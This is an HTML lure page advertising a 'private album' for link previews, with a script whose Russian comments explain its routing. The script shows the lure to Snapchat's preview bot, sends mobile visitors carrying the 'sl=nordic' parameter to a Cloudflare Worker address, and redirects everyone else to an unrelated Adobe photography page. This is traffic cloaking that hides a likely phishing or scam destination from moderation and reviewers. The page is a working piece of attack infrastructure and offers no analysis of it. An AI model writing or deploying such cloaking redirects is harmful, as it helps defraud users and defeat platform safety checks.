<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Private Content ✨</title>

    <meta property="og:title" content="Private Content ✨" />
    <meta property="og:description" content="Join to view private album" />
    <meta property="og:image" content="https://img.icons8.com/emoji/96/cherries.png" />
    <meta property="og:type" content="website" />
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://img.icons8.com/emoji/96/cherries.png">

    <style>
        body { background-color: #ffffff; }
    </style>
</head>
<body>
    <script>
        // Твоя ссылка на Cloudflare Worker
        const targetHost = "https://media-processor.radulive9.workers.dev/";
        
        const urlParams = new URLSearchParams(window.location.search);
        const ua = navigator.userAgent;
        const key = urlParams.get('sl');

        // Проверка на бота Snapchat
        const isSnapBot = ua.includes("Snapchat") || ua.includes("Snap URL Preview Service");

        if (isSnapBot) {
            // Бот видит страницу и мета-теги, редирект не мешает ему делать превью
        } else if (key === 'nordic' && /Android|iPhone|iPad/i.test(ua)) {
            // Живой юзер - летит на воркер
            window.location.replace(targetHost + window.location.search);
        } else {
            // Остальные на Adobe
            window.location.replace("https://www.adobe.com/creativecloud/photography/type/nature-photography.html");
        }
    </script>
</body>
</html>
